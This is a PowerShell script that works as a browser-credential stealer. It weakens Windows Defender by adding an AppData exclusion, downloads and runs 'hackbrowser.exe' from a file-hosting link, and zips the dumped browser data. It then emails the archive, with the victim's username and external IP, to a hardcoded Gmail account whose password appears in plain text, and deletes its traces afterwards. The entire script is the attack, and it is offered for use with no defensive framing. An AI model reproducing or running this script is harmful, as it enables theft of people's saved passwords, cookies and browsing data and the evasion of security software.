#Adding windows defender exclusionpath
Add-MpPreference -ExclusionPath "$env:appdata"
#Creating the directory we will work on
mkdir "$env:appdata\Microsoft\dump"
Set-Location "$env:appdata\Microsoft\dump"
#Downloading and executing hackbrowser.exe
Invoke-WebRequest 'https://download1526.mediafire.com/tg2gqosrqp1g/uz95kbthmsboked/hackbrowser.exe' -OutFile "hb.exe"
.\hb.exe --format json
Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
#Creating A Zip Archive
Compress-Archive -Path * -DestinationPath dump.zip
$Random = Get-Random
#Mailing the output you will need to enable less secure app access on your google account for this to work
$Message = new-object Net.Mail.MailMessage
$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
$smtp.Credentials = New-Object System.Net.NetworkCredential("kaaz.dw@gmail.com", "Kaaz01");
$smtp.EnableSsl = $true
$Message.From = "kaaz.dw@gmail.com"
$Message.To.Add("kaaz.dw@gmail.com")
$ip = Invoke-RestMethod "myexternalip.com/raw"
$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
$Message.Body = $ComputerName
$files=Get-ChildItem 
$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
$smtp.Send($Message)
$Message.Dispose()
$smtp.Dispose()
#Cleanup
cd "$env:appdata"
Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
Remove-MpPreference -ExclusionPath "$env:appdata"
